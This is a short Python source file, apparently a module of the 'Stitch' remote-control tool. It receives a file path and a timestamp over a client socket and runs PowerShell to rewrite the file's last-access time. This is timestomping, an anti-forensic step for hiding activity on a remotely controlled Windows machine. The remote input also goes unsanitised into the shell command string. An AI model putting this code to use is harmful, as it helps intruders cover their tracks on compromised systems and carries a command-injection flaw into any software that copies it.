# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import subprocess

editfile = receive(client_socket)
edittime = receive(client_socket)
if os.path.exists(editfile):
    cmd ='powershell "Get-ChildItem \'%s\' | %% { $_.LastAccessTime = \'%s\' }"' % (editfile,edittime)
    resp = run_command(cmd)
else:
    resp = "[!] {}: No such file or directory\n".format(editfile)
send(client_socket,resp)
